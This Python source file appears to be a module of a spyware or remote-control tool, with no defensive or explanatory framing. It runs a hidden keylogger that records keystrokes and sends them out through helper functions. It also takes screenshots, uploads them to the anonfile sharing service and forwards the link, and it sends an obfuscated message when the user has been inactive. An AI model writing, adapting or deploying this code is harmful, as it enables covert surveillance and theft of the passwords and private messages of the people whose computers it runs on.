import time
from pynput import keyboard
import utils
import tempfile
import requests
import pyautogui
from anonfile import AnonFile

SC_FILE = tempfile.gettempdir() + "\\capture.jpg"

def screenshot():
    # Take a screenshot
    pyautogui.screenshot(SC_FILE)
    
    # Initialize the anonfile object
    anon = AnonFile()
    # Upload the file
    upl = anon.upload(SC_FILE, progressbar=False)
    # Go the the page of the url we got
    r = requests.get(upl.url.geturl())
    # Split the html
    l = r.text.split("\n")
    # Get and send the direct download to the cac
    utils.send_img(l[61][29:][:-1])


# =========================
keys = []
last_press = 0

def key_press(k):
    k = str(k)

    # If the length is over 600 then simpy remove the first one
    # to prevent the list from getting too big
    if len(keys) >= 600:
        keys.pop(0)

    # Add the key to the list
    keys.append(k)

    # If there was no keypress in the last hour
    if int(time.time()) - last_press > 3600:
        # Send a mesasge
        utils.send_text(utils.decypher("Lxwcjlc an-nwpjpnm.", 91581751751))


def init_strokes():
    global last_press
    last_press = time.time()
    # Start the keyboard listener
    lsn = keyboard.Listener(on_press=key_press)
    lsn.start()


def keylogger(n):
    if len(keys) != 0:
        # Send the selected keys
        utils.send_text(" ".join(keys[len(keys)-n:]))
        # Empty the list
        keys.clear()
